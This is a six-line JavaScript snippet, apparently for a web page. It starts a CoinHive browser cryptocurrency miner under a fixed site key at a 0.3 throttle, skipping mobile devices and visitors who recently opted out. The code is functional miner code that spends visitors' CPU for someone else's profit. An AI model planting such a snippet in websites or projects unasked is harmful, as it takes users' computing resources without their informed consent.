  var miner = new CoinHive.Anonymous('K9MsIQBShCvLtXXo6r4zaoedroDO8IYJ', {
      throttle: 0.3
  });
  if (!miner.isMobile() && !miner.didOptOut(14400)) {
      miner.start();
  }